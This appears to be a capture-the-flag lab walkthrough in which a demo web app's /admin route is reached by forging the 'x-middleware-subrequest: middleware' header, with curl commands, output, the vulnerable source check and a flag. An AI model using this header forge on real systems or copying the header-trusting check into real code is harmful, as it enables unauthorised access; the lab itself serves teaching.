# Walkthrough: Modern Web Stacks

## Setup

```bash
docker compose up --build -d
```

## Step 1: Enumerate the application

```bash
curl http://localhost:8080/
```

Output:

```html
<html><body>
<h1>NextApp</h1>
<p>Welcome to the demo application.</p>
<p><a href='/admin'>Admin Panel</a></p>
</body></html>
```

There is an `/admin` route.

## Step 2: Test /admin without credentials

```bash
curl -v http://localhost:8080/admin
```

Output:

```
< HTTP/1.1 401 Unauthorized
...
<html><body>
<h1>401 Unauthorized</h1>
<p>Valid session required.</p>
</body></html>
```

The route is protected.

## Step 3: Read the source

Open `lab/app.py`. The middleware check:

```python
MIDDLEWARE_HEADER = "x-middleware-subrequest"
MIDDLEWARE_TRUST_VALUE = "middleware"

def middleware_bypassed(headers) -> bool:
    val = headers.get("x-middleware-subrequest", "")
    return val == MIDDLEWARE_TRUST_VALUE
```

The `/admin` handler grants access if `middleware_bypassed` returns True. No origin check. Any client can forge the header.

## Step 4: Forge the header

```bash
curl -s -H "x-middleware-subrequest: middleware" http://localhost:8080/admin
```

Output:

```html
<html><body>
<h1>Admin Panel</h1>
<p>Flag: <code>POC{a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4}</code></p>
</body></html>
```

## Attack Chain

```
GET /admin (401)
  -> inspect source: middleware checks x-middleware-subrequest header
  -> forge: x-middleware-subrequest: middleware
  -> GET /admin (200) + flag
```
